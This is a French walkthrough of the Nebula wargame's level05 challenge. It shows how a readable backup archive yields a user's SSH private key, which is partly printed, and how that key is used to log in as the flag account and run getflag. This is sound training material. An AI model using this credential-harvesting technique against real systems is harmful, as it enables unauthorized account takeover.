# Challenge 05

Le but de ce challenge est de trouver un dossier avec des permissions faibles : `You are looking for weak directory permissions.`

Je commence par regarder en détail ce qu'il y a dans le repertoire `/home/flag05` :

```bash
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
``` 

On remarque un dossier `.backup` avec les permissions : `drwxr-xr-x`.
Cela signifie que dans ce dossier on peut executer ce qu'il contient.

On vérifie ce qu'il contient :
```bash
level05@nebula:/home/flag05$ ls -la .backup/
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
```

J'extrais le contenu de l'archive dans `/tmp` :
```bash
level05@nebula:/home/flag05/.backup$ tar -xvzf backup-19072011.tgz -C /tmp
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

Rappel :
- `-x`: extrait de l'archive
- `-v`: active verbose (quels fichiers sont extraits)
- `-z`: débloque la compression gzip
- `-f`: donne le PATH du fichier à ouvrir

On se retrouve avec la clé privée SSH du `flag05` :
```bash
level05@nebula:/tmp/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAywCDXFL7nGpgxuT8y8ZYyzif565M6LexECfaRFl6ECQtP2Vp
vns4RR0HeVFpZMD2dhQQ76sXXK4Jph0/xVRgYytF1hsCJLiedJ3+aWyRMYtkgvZD
[REDACTED]
RcmThwKBgAi0ej7ylHhtwODQGghRmDpxEx9deJ0jilM2EnqIecJj5jnPW8BKDgV4
Dc1QljBeCQ1r30DGYmOIazbhm+orm4df6HWPayRhNBlkmulqTs5GHvLMPjcKMB0k
0Xna7QOtBAnzoHpLcrfvBdfRNE1eC87YkPUhmm5hBgG0+TeMmWgr
-----END RSA PRIVATE KEY-----
```
On a plus qu'à se connecter à l'host avec la clé privée.

`level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@nebula`

Puis il nous reste plus qu'à activer le flag :
```bash
flag05@nebula:~$ id
uid=994(flag05) gid=994(flag05) groups=994(flag05)
flag05@nebula:~$ /bin/getflag
You have successfully executed getflag on a target account
```

Bingo !
